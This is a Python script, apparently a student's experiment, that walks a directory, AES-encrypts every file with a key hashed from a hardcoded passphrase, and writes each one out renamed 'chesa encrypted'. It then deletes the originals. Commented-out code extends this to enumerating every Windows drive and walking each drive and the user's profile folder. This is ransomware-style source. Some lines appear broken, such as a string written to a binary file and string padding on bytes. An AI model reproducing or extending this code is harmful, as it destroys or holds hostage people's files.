import os
import string
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

#
# drives = []
# fdrives = []
#
# for x in string.ascii_uppercase:
#     if os.path.exists(f"{x}:"):
#         drives.append(x)
#
# print(drives)

IV = os.urandom(16)
file = ""
chunksize = 64*1024


hash = SHA256.new("*&$%^@#!%$@$!@erfgfxchgjhFGDFHJGHKJHJGHHKJHH57676877ggfgfd&^%$%#$#$rfrfsdg".encode())
key = hash.digest()
cipher = AES.new(key, AES.MODE_CBC, IV)


for path, dir, files in os.walk("/root/Documents/student/test"):
    for file in files:
        fsize = str(os.path.getsize(os.path.join(path, file))).zfill(16)
        with open(os.path.join(path, file), "rb") as inp:
            outf = "chesa encrypted "+ file
            with open(os.path.join(path, outf), "wb") as outp:
                outp.write(fsize)
                outp.write(IV)

                while True:
                    data = inp.read(chunksize)
                    n = len(data)
                    if n == 0:
                        break
                    elif n % 16 != 0:
                        data += ' ' * (16 - n % 16)

                    outp.write(cipher.encrypt(data))

        os.remove(os.path.join(path, file))

        #     while True:
        #         data = inp.read(chunksize)
        #         n = len(data)
        #         if n == 0:
        #             break
        #         elif n % 16 != 0:
        #             data += ' '.encode() * (16 - n % 16)
        #
        #         endata = cipher.encrypt(data)
        #














# for path, dir, files in os.walk("C:\\Users\\Kent\\Documents\\Student\\python\\TEST"):
#     for file in files:
#         with open(os.path.join(path, file), "rb") as inp:
#             with open(os.path.join(path, "Chesa Encrypted " + file), "wb") as outp:
#
#         os.remove(os.path.join(path, file))





# for x in drives:
#     if x is not os.environ["SYSTEMDRIVE"][0]:
#         for path, dir, files in os.walk(f"{x}:"):
#             try:
#                 with open(os.path.join(path, "sam.new"), "w") as f:
#                     f.write("sam")
#             except:
#                 continue
#     else:
#         drive = os.environ['SYSTEMDRIVE']
#         user = os.environ["USERNAME"]
#         for path, dir, files in os.walk(f"{drive}\\Users\\{user}"):
#             try:
#                 with open(os.path.join(path, "sam.new"), "w") as f:
#                     f.write("sam")
#             except:
#                 continue








    # for path, dir, files in os.walk(f"{x}:"):
    #     try:
    #         with open(os.path.join(path, "sam.new"), "w") as f:
    #             f.write("sam")
    #     except:
    #         continue

